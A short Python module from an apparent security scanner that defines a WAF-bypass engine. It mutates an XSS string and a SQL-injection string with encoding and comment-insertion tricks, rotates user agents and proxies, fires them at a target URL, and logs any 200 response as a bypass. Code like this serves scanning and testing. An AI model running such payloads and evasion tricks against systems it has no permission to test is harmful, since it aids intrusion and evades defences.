import random
import urllib
import urllib.parse

from cyberapp.models.db import db_conn

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

PROXY_POOL = []


class WAFBypassEngine:
    def __init__(self, target, scan_id):
        self.target = target
        self.scan_id = scan_id
        self.payloads = ["<script>alert(1)</script>", "' OR 1=1 --"]

    def mutate(self, payload):
        return [
            urllib.parse.quote(payload),
            "".join([f"%u00{ord(c):x}" for c in payload]),
            payload.replace(" ", "/**/").replace("OR", "/*!OR*/"),
        ]

    def start(self):
        with db_conn() as conn:
            conn.execute(
                "INSERT INTO tool_logs (scan_id, tool_name, output) VALUES (?, ?, ?)",
                (self.scan_id, "WAF_BYPASS", "Bypass denemeleri başladı..."),
            )

        for p in self.payloads:
            for m in self.mutate(p):
                try:
                    proxy = random.choice(PROXY_POOL) if PROXY_POOL else None

                    req = urllib.request.Request(
                        f"{self.target}?q={m}",
                        headers={'User-Agent': random.choice(USER_AGENTS)},
                    )
                    if proxy:
                        req.set_proxy(proxy, 'http')

                    res = urllib.request.urlopen(req, timeout=5)
                    if res.getcode() == 200:
                        with db_conn() as conn:
                            conn.execute(
                                "INSERT INTO vulns (scan_id, type, url, fix) VALUES (?, ?, ?, ?)",
                                (self.scan_id, "WAF_BYPASSED", self.target, f"Payload işledi: {m}"),
                            )
                except Exception:
                    pass
